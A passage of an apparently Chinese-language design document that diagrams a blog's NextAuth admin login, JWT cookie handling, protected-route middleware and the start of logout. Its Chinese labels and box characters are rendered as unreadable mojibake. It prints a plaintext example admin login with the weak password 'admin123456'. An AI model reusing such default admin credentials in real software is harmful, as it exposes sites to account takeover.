â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 3. ç‚¹å‡»"ç™»å½•"æŒ‰é’®                                           â”‚
â”‚    è§¦å‘ handleSubmit() å‡½æ•°                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 4. å‰ç«¯è°ƒç”¨ signIn()                                        â”‚
â”‚    signIn('credentials', {                                  â”‚
â”‚      email: 'admin@tftblog.com',                            â”‚
â”‚      password: 'admin123456',                               â”‚
â”‚      redirect: false                                        â”‚
â”‚    })                                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 5. NextAuth å‘é€ POST è¯·æ±‚                                  â”‚
â”‚    POST /api/auth/callback/credentials                      â”‚
â”‚    Body: { email, password, csrfToken }                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 6. åç«¯è°ƒç”¨ authorize() å‡½æ•°ï¼ˆauth.tsï¼‰                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 7. è¿æ¥æ•°æ®åº“                                               â”‚
â”‚    await dbConnect()                                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 8. æŸ¥è¯¢ç”¨æˆ·                                                 â”‚
â”‚    const admin = await Admin.findOne({ email })             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 9. éªŒè¯å¯†ç                                                  â”‚
â”‚    const isValid = await admin.comparePassword(password)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 10. bcrypt æ¯”å¯¹å“ˆå¸Œ                                         â”‚
â”‚     bcrypt.compare('admin123456', hashedPassword)           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 11. âœ… éªŒè¯æˆåŠŸ                                             â”‚
â”‚     è¿”å›ç”¨æˆ·å¯¹è±¡:                                           â”‚
â”‚     {                                                       â”‚
â”‚       id: '507f1f77bcf86cd799439011',                       â”‚
â”‚       email: 'admin@tftblog.com',                           â”‚
â”‚       name: 'Admin',                                        â”‚
â”‚       role: 'admin'                                         â”‚
â”‚     }                                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 12. è§¦å‘ jwt() å›è°ƒ                                         â”‚
â”‚     ç”Ÿæˆ JWT Token                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 13. Token å†…å®¹ï¼ˆè§£å¯†åï¼‰                                    â”‚
â”‚     {                                                       â”‚
â”‚       id: '507f1f77bcf86cd799439011',                       â”‚
â”‚       email: 'admin@tftblog.com',                           â”‚
â”‚       name: 'Admin',                                        â”‚
â”‚       role: 'admin',                                        â”‚
â”‚       iat: 1707734400,   // ç­¾å‘æ—¶é—´                        â”‚
â”‚       exp: 1708339200    // è¿‡æœŸæ—¶é—´ï¼ˆ7å¤©åï¼‰              â”‚
â”‚     }                                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 14. ä½¿ç”¨ NEXTAUTH_SECRET åŠ å¯† Token                         â”‚
â”‚     ç”Ÿæˆç­¾å: HMACSHA256(header + payload, secret)          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 15. è®¾ç½® HttpOnly Cookie                                    â”‚
â”‚     Set-Cookie: next-auth.session-token=<encrypted-jwt>;    â”‚
â”‚                 HttpOnly;                                   â”‚
â”‚                 Secure;                                     â”‚
â”‚                 SameSite=Lax;                               â”‚
â”‚                 Path=/;                                     â”‚
â”‚                 Max-Age=604800                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 16. è¿”å›å“åº”åˆ°å‰ç«¯                                          â”‚
â”‚     { ok: true }                                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 17. å‰ç«¯æ£€æµ‹ result.ok === true                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 18. é‡å®šå‘åˆ°æ§åˆ¶å°                                          â”‚
â”‚     router.push('/dashboard')                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 19. ä¸­é—´ä»¶æ‹¦æˆªè¯·æ±‚                                          â”‚
â”‚     middleware.ts æ£€æŸ¥ Cookie                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 20. è§£å¯†å¹¶éªŒè¯ JWT                                          â”‚
â”‚     - éªŒè¯ç­¾å                                              â”‚
â”‚     - æ£€æŸ¥è¿‡æœŸæ—¶é—´                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 21. æ³¨å…¥ req.auth                                           â”‚
â”‚     req.auth = {                                            â”‚
â”‚       user: {                                               â”‚
â”‚         id: '...',                                          â”‚
â”‚         email: 'admin@tftblog.com',                         â”‚
â”‚         name: 'Admin',                                      â”‚
â”‚         role: 'admin'                                       â”‚
â”‚       }                                                     â”‚
â”‚     }                                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 22. âœ… æ”¾è¡Œï¼Œæ¸²æŸ“ /dashboard é¡µé¢                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.2 è®¿é—®å—ä¿æŠ¤è·¯ç”±æµç¨‹

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. ç”¨æˆ·è®¿é—® /dashboard                                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 2. ä¸­é—´ä»¶æ‹¦æˆªï¼ˆmiddleware.tsï¼‰                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 3. è¯»å– Cookie                                              â”‚
â”‚    Cookie: next-auth.session-token=<encrypted-jwt>          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 4. è§£å¯† JWT Token                                           â”‚
â”‚    ä½¿ç”¨ NEXTAUTH_SECRET è§£å¯†                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 5. éªŒè¯ Token                                               â”‚
â”‚    - æ£€æŸ¥ç­¾åæ˜¯å¦æ­£ç¡®                                       â”‚
â”‚    - æ£€æŸ¥æ˜¯å¦è¿‡æœŸï¼ˆexp < å½“å‰æ—¶é—´ï¼‰                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â†“                                       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ âœ… Token æœ‰æ•ˆ     â”‚               â”‚ âŒ Token æ— æ•ˆ     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â†“                                       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ³¨å…¥ req.auth     â”‚               â”‚ req.auth = null   â”‚
â”‚ req.auth = {      â”‚               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚   user: {...}     â”‚                       â†“
â”‚ }                 â”‚               â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚ é‡å®šå‘åˆ°ç™»å½•é¡µ    â”‚
        â†“                           â”‚ /login?           â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚ callbackUrl=/...  â”‚
â”‚ isLoggedIn = true â”‚               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç»§ç»­æ¸²æŸ“é¡µé¢      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é¡µé¢è°ƒç”¨ auth()   â”‚
â”‚ è·å–å®Œæ•´ session  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ˜¾ç¤ºç”¨æˆ·æ•°æ®      â”‚
â”‚ å’Œå†…å®¹            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.3 é€€å‡ºæµç¨‹

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. ç”¨æˆ·ç‚¹å‡»"é€€å‡º"æŒ‰é’®                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 2. æäº¤ Server Action form                                  â”‚
â”‚    <form action={async () => {                              â”‚
â”‚      'use server';                                          â”‚
â”‚      await signOut({ redirectTo: '/' });                    â”‚
â”‚    }}>                                                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
